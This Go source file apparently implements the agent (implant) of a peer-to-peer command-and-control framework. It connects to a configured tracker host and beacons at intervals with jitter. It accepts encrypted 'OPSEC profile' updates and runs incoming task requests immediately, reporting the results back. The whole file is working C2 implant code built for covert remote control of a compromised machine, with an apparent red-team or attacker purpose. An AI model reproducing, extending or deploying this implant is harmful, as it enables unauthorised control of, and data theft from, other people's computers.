package agent

import (
	"fmt"
	"p2p-c2-framework/core"
	"p2p-c2-framework/network"
	"p2p-c2-framework/util"
	"sync"
	"time"
)

// Agent represents a C2 agent
type Agent struct {
	peerID           string
	keyPair          *core.RSAKeyPair
	keyStore         *core.KeyStore
	sessionTable     *core.SessionTable
	handshakeManager *core.HandshakeManager
	networkManager   *network.NetworkManager
	beaconManager    *BeaconManager
	taskExecutor     *TaskExecutor
	logger           *util.Logger
	config           *AgentConfig
	isRunning        bool
	mutex            sync.RWMutex
	pendingTasks     []*core.Task
	taskMutex        sync.RWMutex
}

// AgentConfig represents agent configuration
type AgentConfig struct {
	TrackerAddress    string
	TrackerPort       int
	TrackerPeerID     string
	BeaconInterval    time.Duration
	BeaconJitter      int
	WorkingDirectory  string
	TempDirectory     string
	KeyDirectory      string
	MaxTasksPerBeacon int
	Capabilities      []string
}

// NewAgent creates a new agent
func NewAgent(config *AgentConfig) (*Agent, error) {
	// Create key store
	keyStore, err := core.NewKeyStore(config.KeyDirectory)
	if err != nil {
		return nil, fmt.Errorf("failed to create key store: %w", err)
	}

	// Get local key pair
	keyPair := keyStore.GetLocalKeyPair()

	// Generate peer ID
	peerID, err := core.GeneratePeerID(keyPair.PublicKey)
	if err != nil {
		return nil, err
	}

	// Create session table
	sessionTable := core.NewSessionTable()

	// Create handshake manager
	handshakeManager := core.NewHandshakeManager(peerID, keyPair, sessionTable)

	// Create network manager
	networkManager := network.NewNetworkManager(peerID, sessionTable, keyPair)

	// Create beacon config
	beaconConfig := &BeaconConfig{
		Interval:      config.BeaconInterval,
		Jitter:        config.BeaconJitter,
		TrackerPeerID: config.TrackerPeerID,
	}

	// Create beacon manager
	beaconManager := NewBeaconManager(peerID, sessionTable, keyPair, beaconConfig)

	// Create task executor
	taskExecutor := NewTaskExecutor(peerID, config.WorkingDirectory, config.TempDirectory)

	agent := &Agent{
		peerID:           peerID,
		keyPair:          keyPair,
		keyStore:         keyStore,
		sessionTable:     sessionTable,
		handshakeManager: handshakeManager,
		networkManager:   networkManager,
		beaconManager:    beaconManager,
		taskExecutor:     taskExecutor,
		logger:           util.GetLogger("agent"),
		config:           config,
		pendingTasks:     make([]*core.Task, 0),
	}

	// Set up network message handler
	networkManager.SetMessageHandler(agent.handleMessage)

	// Set up beacon callback
	beaconManager.SetBeaconCallback(agent.sendBeacon)

	return agent, nil
}

// Start starts the agent
func (a *Agent) Start() error {
	a.mutex.Lock()
	defer a.mutex.Unlock()

	if a.isRunning {
		return nil
	}

	a.logger.Info("Starting agent %s", a.peerID[:16]+"...")

	// Connect to tracker
	err := a.connectToTracker()
	if err != nil {
		return err
	}

	// Start beacon manager
	a.beaconManager.Start()

	a.isRunning = true
	a.logger.Info("Agent started successfully")

	return nil
}

// Stop stops the agent
func (a *Agent) Stop() {
	a.mutex.Lock()
	defer a.mutex.Unlock()

	if !a.isRunning {
		return
	}

	a.logger.Info("Stopping agent")

	// Stop beacon manager
	a.beaconManager.Stop()

	// Shutdown network manager
	a.networkManager.Shutdown()

	a.isRunning = false
	a.logger.Info("Agent stopped")
}

// connectToTracker connects to the tracker
func (a *Agent) connectToTracker() error {
	a.logger.Info("Connecting to tracker at %s:%d", a.config.TrackerAddress, a.config.TrackerPort)

	// Connect to tracker
	_, err := a.networkManager.ConnectTCP(a.config.TrackerAddress, a.config.TrackerPort)
	if err != nil {
		return err
	}

	a.logger.Info("Connected to tracker successfully")
	return nil
}

// handleMessage handles incoming messages
func (a *Agent) handleMessage(packet *core.Packet, conn *network.Connection) {
	a.logger.Debug("Received packet type %s from %s", packet.Type, packet.PeerID)

	switch packet.Type {
	case core.PacketTypeHandshakeInit:
		a.handleHandshakeInit(packet, conn)
	case core.PacketTypeHandshakeResponse:
		a.handleHandshakeResponse(packet, conn)
	case core.PacketTypeTaskRequest:
		a.handleTaskRequest(packet, conn)
	case core.PacketTypeOpsecProfile:
		a.handleOpsecProfile(packet, conn)
	default:
		a.logger.Warn("Unhandled packet type: %s", packet.Type)
	}
}

// handleHandshakeInit handles handshake init packets
func (a *Agent) handleHandshakeInit(packet *core.Packet, conn *network.Connection) {
	// Get tracker's public key from keystore
	trackerPublicKey, exists := a.keyStore.GetPeerPublicKey(packet.PeerID)
	if !exists {
		a.logger.Error("Unknown peer attempting handshake: %s", packet.PeerID)
		return
	}

	responsePacket, err := a.handshakeManager.HandleHandshakeInit(packet, trackerPublicKey)
	if err != nil {
		a.logger.Error("Failed to handle handshake init: %v", err)
		return
	}

	// Send response
	err = a.networkManager.SendPacket(responsePacket, packet.PeerID)
	if err != nil {
		a.logger.Error("Failed to send handshake response: %v", err)
	}
}

// handleHandshakeResponse handles handshake response packets
func (a *Agent) handleHandshakeResponse(packet *core.Packet, conn *network.Connection) {
	// Get tracker's public key from keystore
	trackerPublicKey, exists := a.keyStore.GetPeerPublicKey(packet.PeerID)
	if !exists {
		a.logger.Error("Unknown peer in handshake response: %s", packet.PeerID)
		return
	}

	err := a.handshakeManager.HandleHandshakeResponse(packet, trackerPublicKey)
	if err != nil {
		a.logger.Error("Failed to handle handshake response: %v", err)
		return
	}

	a.logger.Info("Handshake completed with %s", packet.PeerID)
}

// handleTaskRequest handles task request packets
func (a *Agent) handleTaskRequest(packet *core.Packet, conn *network.Connection) {
	// Get session key for decryption
	sessionKey, err := a.handshakeManager.GetSessionKey(packet.PeerID)
	if err != nil {
		a.logger.Error("No session key for peer %s: %v", packet.PeerID, err)
		return
	}

	// Parse task request payload
	var payload core.TaskRequestPayload
	err = packet.GetPayload(sessionKey, &payload)
	if err != nil {
		a.logger.Error("Failed to parse task request: %v", err)
		return
	}

	// Add task to pending tasks
	a.addPendingTask(payload.Task)
}

// handleOpsecProfile handles OPSEC profile updates
func (a *Agent) handleOpsecProfile(packet *core.Packet, conn *network.Connection) {
	// Get session key for decryption
	sessionKey, err := a.handshakeManager.GetSessionKey(packet.PeerID)
	if err != nil {
		a.logger.Error("No session key for peer %s: %v", packet.PeerID, err)
		return
	}

	// Parse OPSEC profile payload
	var payload core.OpsecProfilePayload
	err = packet.GetPayload(sessionKey, &payload)
	if err != nil {
		a.logger.Error("Failed to parse OPSEC profile: %v", err)
		return
	}

	// Update beacon configuration
	newConfig := &BeaconConfig{
		Interval:      time.Duration(payload.BeaconInterval) * time.Second,
		Jitter:        payload.Jitter,
		TrackerPeerID: a.config.TrackerPeerID,
	}

	a.beaconManager.UpdateConfig(newConfig)
	a.logger.Info("OPSEC profile updated")
}

// addPendingTask adds a task to the pending tasks list
func (a *Agent) addPendingTask(task *core.Task) {
	a.taskMutex.Lock()
	defer a.taskMutex.Unlock()

	a.pendingTasks = append(a.pendingTasks, task)
	a.logger.Info("Added task %s to pending tasks", task.ID)

	// Execute task immediately for now
	go a.executeTask(task)
}

// executeTask executes a task
func (a *Agent) executeTask(task *core.Task) {
	result := a.taskExecutor.ExecuteTask(task)
	
	// Add result to beacon manager
	a.beaconManager.AddTaskResult(result)
	
	// Remove from pending tasks
	a.removePendingTask(task.ID)
}

// removePendingTask removes a task from pending tasks
func (a *Agent) removePendingTask(taskID string) {
	a.taskMutex.Lock()
	defer a.taskMutex.Unlock()

	for i, task := range a.pendingTasks {
		if task.ID == taskID {
			a.pendingTasks = append(a.pendingTasks[:i], a.pendingTasks[i+1:]...)
			break
		}
	}
}

// sendBeacon sends a beacon packet
func (a *Agent) sendBeacon(packet *core.Packet) error {
	return a.networkManager.SendPacket(packet, a.config.TrackerPeerID)
}

// GetPeerID returns the agent's peer ID
func (a *Agent) GetPeerID() string {
	return a.peerID
}

// GetStatus returns the agent's status
func (a *Agent) GetStatus() map[string]interface{} {
	a.mutex.RLock()
	defer a.mutex.RUnlock()

	return map[string]interface{}{
		"peer_id":       a.peerID,
		"is_running":    a.isRunning,
		"connections":   a.networkManager.GetConnectionCount(),
		"pending_tasks": len(a.pendingTasks),
		"capabilities":  a.taskExecutor.GetCapabilities(),
	}
}

// IsRunning returns true if the agent is running
func (a *Agent) IsRunning() bool {
	a.mutex.RLock()
	defer a.mutex.RUnlock()
	return a.isRunning
}

